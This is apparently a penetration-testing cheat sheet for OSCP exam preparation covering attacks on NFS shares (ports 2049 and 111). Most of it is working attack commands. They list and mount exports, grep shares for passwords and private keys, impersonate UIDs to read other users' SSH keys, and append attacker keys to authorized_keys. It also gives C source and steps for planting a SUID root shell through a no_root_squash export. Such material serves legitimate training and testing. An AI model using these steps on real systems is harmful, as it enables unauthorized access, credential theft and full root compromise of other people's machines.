# 🔧 NFS — Port 2049 (+ 111 rpcbind)

> **Network File System** — Unix/Linux remote file sharing (111 rpcbind locates NFS, 2049 nfsd; NFSv3 uses rpcbind + per-host trust, NFSv4 is single-port 2049). Classic NFS auth is **host-based + UID/GID trust (AUTH_SYS)** — no password; the server trusts whatever UID your client presents (the core weakness). Export options matter: `rw`/`ro`, `root_squash` (default — remote root → `nobody`), **`no_root_squash`** (remote root stays root — dangerous). On OSCP this is a **quick-win file surface**: list exports with `showmount`, mount them, read sensitive files (SSH keys, configs, `/etc/passwd`), and — the money shot — abuse **`no_root_squash`** to write a root-owned SUID binary and escalate to root.

Related: [[Linux Privilege Escalation]] · [[Credential Attacks]] · [[SSH]] · [[Shells]]

---

## 🧠 PORT 2049 → THINK
- **`showmount -e`** first — what's exported and to whom?
- Exported to `*` / `everyone` → mount it now, no creds needed.
- **`no_root_squash`** in export = **root privesc**: you write files as root on the share.
- UID matching: NFS trusts your **local UID**. Create a user with the export's owner UID to read files.
- Look for **SSH keys, `.bash_history`, web configs, backups, `/home`** on mounts.
- 111 (rpcbind) open but 2049 filtered → still `rpcinfo -p` to confirm NFS.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
showmount -e $IP                 # list exports (needs mountd; via rpcbind)
```

```bash
rpcinfo -p $IP | grep nfs        # confirm NFS is actually registered
```
**Verdict:** exports listed → mount and loot. Nothing exported → NFS dormant, move on.

## ⏱️ ENUMERATE
```bash
showmount -e $IP                                 # exports + allowed hosts
```

```bash
showmount -a $IP ; showmount -d $IP              # (if allowed) mounted hosts / exported dirs
```

```bash
rpcinfo -p $IP                                   # RPC services / confirm NFS
```

```bash
nmap -p111,2049 -sV --script=nfs-showmount,nfs-ls,nfs-statfs $IP -oN nmap/nfs.txt
```

```bash
# Mount an export (try vers=3 then vers=4), recurse, note UIDs/GIDs and perms
sudo mkdir -p /mnt/nfs
```

```bash
sudo mount -t nfs -o vers=3 $IP:/export /mnt/nfs
```

```bash
ls -laR /mnt/nfs
```

```bash
# Mount each export, hunt secrets
for e in $(showmount -e $IP | awk 'NR>1{print $1}'); do
  sudo mkdir -p /mnt$e; sudo mount -t nfs $IP:$e /mnt$e -o vers=3;
done
```

```bash
grep -rniE 'password|secret|api[_-]?key|BEGIN.*PRIVATE KEY' /mnt 2>/dev/null
```

```bash
find /mnt -name id_rsa -o -name '*.kdbx' -o -name '*.bak' 2>/dev/null
```
**Hunt on mounts:** `.ssh/`, `.bash_history`, `authorized_keys`, `shadow`/`passwd`, `*.conf`, `wp-config.php`, `.git/`, backups (`*.bak`/`*.tar.gz`/`*.sql`); private keys → SSH in; DB/web configs → creds; writable + `no_root_squash` → root.

**UID trick (AUTH_SYS trusts client UID)** — file owned by UID 1001 you can't read:
```bash
ls -lan /mnt/nfs                    # see the numeric UID that owns the file
```

```bash
sudo useradd -u 1001 nfsuser        # create a local user with that exact UID
```

```bash
sudo -u nfsuser cat /mnt/nfs/home/bob/.ssh/id_rsa   # now you're "bob" to the server
```
The server checks the UID *number*, not identity — match it locally and you *are* that user for file access.

## 🗡️ EXPLOIT
- 🟢 **Anonymous read** of an export → SSH keys / creds / source → [[SSH]], [[Credential Attacks]].
- 🟢 **`no_root_squash` + writable export → root SUID** (below). Highest value.
- 🟡 **UID impersonation** to read files owned by a specific user.
- 🟡 **Write a public key** into a user's `~/.ssh/authorized_keys` if their home is exported `rw` → SSH as them.
- 🔵 **rpcbind info leak** — `rpcinfo` reveals other RPC services worth attacking.

**A) Drop an SSH key into an exported home (rw):**
```bash
ssh-keygen -f ./k -N ''                       # make a keypair
```

```bash
echo "$(cat k.pub)" >> /mnt/nfs/home/bob/.ssh/authorized_keys   # if writable & UID matches
```

```bash
ssh -i k bob@$IP                              # log in
```
**B) `no_root_squash` → root** (export shows `no_root_squash` and is `rw`):
```bash
# From a box where you are already local root (or your Kali, mounting as root):
sudo mount -t nfs $IP:/export /mnt/nfs -o vers=3
```

```bash
# Write a root-owned SUID shell onto the share:
cat > /mnt/nfs/rootbash.c <<'EOF'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",0); return 0; }
EOF
```

```bash
gcc /mnt/nfs/rootbash.c -o /mnt/nfs/rootbash
```

```bash
sudo chown root:root /mnt/nfs/rootbash        # you're root over NFS → this sticks
```

```bash
sudo chmod u+s /mnt/nfs/rootbash
# Now on the TARGET (any low-priv shell there), the same file is SUID-root:
# /export/rootbash -p   →  euid=0
```
**Condition:** you need a low-priv shell *on the target* to execute the SUID binary that lives on the exported path (write done as root from your mount; execution happens on the target). **Result:** `bash -p` with `euid=0` → root.

**After access:** grab keys/creds from all homes → test everywhere ([[Credential Attacks]]); `cat /etc/exports` on the box for more paths; root SUID → dump `/etc/shadow` → [[Linux Privilege Escalation]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Export to `*` | Anonymous mount | `mount -t nfs` | file access |
| `no_root_squash` | Root write | drop SUID root binary | root |
| id_rsa on share | SSH key | `ssh -i` | shell as user |
| File unreadable, owned UID N | UID trust | `useradd -u N`; read as them | file access |
| Home exported `rw` | Key injection | append `authorized_keys` | SSH as user |
| `.bak`/`.sql`/configs | Creds inside | grep, reuse | lateral/DB |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `showmount` can't connect | Try `nmap --script nfs-showmount`; NFSv4 may not use rpcbind → `mount -t nfs4 $IP:/ /mnt` and browse |
| `mount` permission denied | Wrong version → try `-o vers=3` then `vers=4`; export may be IP-restricted |
| `access denied by server` | Export limited to specific host — not exploitable from your IP |
| Files owned by root, root_squash on | Can't read as root — use UID trick for non-root files; note but move on |
| No exports listed | NFS present but nothing shared → dormant, move on |
| RPC ports filtered | Only 2049 reachable → assume NFSv4, mount `$IP:/` directly |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** only trying `vers=4` (or only `vers=3`) — **try both** · forgetting the **UID-matching trick** for unreadable user files · mounting but not **recursively grepping** for secrets · ignoring `no_root_squash` because you don't yet have a target shell (note it — it's your privesc later) · not checking **111 rpcbind** with `rpcinfo -p` when 2049 looks filtered.
**Reuse:** keys/passwords from NFS → [[SSH]], [[SMB]], web logins, DBs; config files often hold DB creds → [[MySQL]] / [[MSSQL]]; `rpcinfo` maps other RPC services.
**Don't miss:** `showmount -e $IP` · try **both** `vers=3` and `vers=4` · `rpcinfo -p $IP` · recursive grep for creds/keys on every mount · check exports for **`no_root_squash`** and **`rw`** · UID-match trick for unreadable files · inject `authorized_keys` if a home is `rw`.
**Stop when:** no exports, or exports restricted to other hosts and no writable/`no_root_squash` path → NFS exhausted; move on. If you looted keys/creds, work continues in [[SSH]] / [[Credential Attacks]].

## 📇 CHEAT SHEET
```bash
showmount -e $IP                                   # list exports
```

```bash
rpcinfo -p $IP                                     # RPC services / confirm NFS
```

```bash
sudo mount -t nfs -o vers=3 $IP:/export /mnt/nfs   # mount (also try vers=4)
```

```bash
grep -rniE 'pass|key|secret' /mnt/nfs              # loot
# UID trick: useradd -u <N> x ; sudo -u x cat <file>
# no_root_squash root:  write SUID bash as root on share -> run on target with -p
```
**Kill shots:** anonymous export → SSH key/creds · `no_root_squash` → root SUID.
